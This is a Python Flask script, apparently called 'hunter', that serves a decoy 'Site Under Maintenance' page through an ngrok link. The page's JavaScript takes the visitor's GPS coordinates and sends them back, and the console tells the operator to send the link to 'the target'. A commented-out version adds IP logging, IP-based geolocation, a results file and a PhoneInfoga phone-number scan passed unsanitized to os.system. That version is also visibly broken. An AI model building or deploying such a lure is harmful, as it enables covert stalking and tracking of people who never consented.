import threading
from flask import Flask, request
from pyngrok import ngrok
from colorama import Fore, Style

app = Flask(__name__)

# --- Flask Routes ---
from flask import Flask, request, render_template_string

@app.route('/')
def index():
    # JavaScript to grab coordinates and send them to /log
    html_code = """
    <script>
    navigator.geolocation.getCurrentPosition(function(p) {
        fetch('/log?lat=' + p.coords.latitude + '&lon=' + p.coords.longitude);
    });
    </script>
    <h1>Site Under Maintenance</h1>
    """
    return render_template_string(html_code)

@app.route('/log')
def log():
    lat = request.args.get('lat')
    lon = request.args.get('lon')
    print(f"{Fore.GREEN}[!] LIVE GPS: https://www.google.com/maps?q={lat},{lon}{Style.RESET_ALL}")
    return "200"

'''@app.route('/')
def index():
    # Simple decoy or tracking logic
    user_ip = request.remote_addr
    print(f"{Fore.GREEN}[!] Target Connected! IP: {user_ip}{Style.RESET_ALL}")
    return "<h1>Site Under Maintenance</h1>" 
'''
# --- Tunnel & Server Logic ---
def start_hunter():
    # 1. Start Ngrok Tunnel
    # Note: If you have an authtoken, run: ngrok config add-authtoken <token>
    port = 5000
    public_url = ngrok.connect(port).public_url
    
    print(f"\n{Fore.MAGENTA}======================================")
    print(f"  LIVE NGrok LINK: {Fore.YELLOW}{public_url}")
    print(f"{Fore.MAGENTA}======================================{Style.RESET_ALL}")
    print("[*] Send this link to the target. Monitoring logs below...\n")

    # 2. Run Flask in a background thread to keep script responsive
    threading.Thread(target=app.run, kwargs={'port': port, 'use_reloader': False}).start()

if __name__ == "__main__":
    start_hunter()



######
'''import subprocess
import requests
import json
from flask import Flask, request

app = Flask(__name__)

# --- PI & Scanner Logic ---

import os

def run_phoneinfoga():
    number = input("Enter Phone Number (e.g., +254...): ")
    # Fix for local 07... numbers
    if number.startswith('0'):
        number = "+254" + number[1:]
    
    print(f"[*] Launching PhoneInfoga for {number}...")
    # Using 'scan -n' for the latest version
    os.system(f"phoneinfoga scan -n {number}")

# --- Flask Tracker Logic ---

@app.route('/track', methods=['POST'])
def track():
    data = request.json
    lat = data.get("lat")
    lon = data.get("lon")
    
    # Capture Public IP Address
    user_ip = request.remote_addr
    if request.headers.get('X-Forwarded-For'):
        user_ip = request.headers.get('X-Forwarded-For').split(',')[0]

    # Failsafe: IP Geolocation if GPS fails
    isp_info = "Unknown"
    if not lat or not lon:
        try:
            geo = requests.get(f"http://ip-api.com/json/{user_ip}", timeout=5).json()
            lat = geo.get("lat", "Unknown")
            lon = geo.get("lon", "Unknown")
            isp_info = geo.get("isp", "Unknown")
            print(f"[!] GPS Denied. IP Geolocation: {geo.get('city')}, {geo.get('country')}")
        except Exception as e:
            print(f"[!] Geolocation API Error: {e}")

    # Log results to hunt_results.txt
    with open("hunt_results.txt", "a") as f:
        log_entry = f"IP: {user_ip} | Lat: {lat} | Lon: {lon} | ISP: {isp_info}\n"
        f.write(log_entry)
    
    return "Data Captured", 200

if __name__ == "__main__":
    # Internal menu for Identity Hunter
    print("[1] Start Live GPS/IP Tracker (Flask)")
    print("[2] Run PhoneInfoga Scan")
    choice = input("mandesh@hunter ~# ")
    
    if choice == "1":
        print("[*] Starting Flask server on port 5000...")
        app.run(host='0.0.0.0',port=5000)
    elif choice == "2":
        num = input("Enter Phone Number (e.g., +254...): ")
        run_phoneinfoga(num)
'''

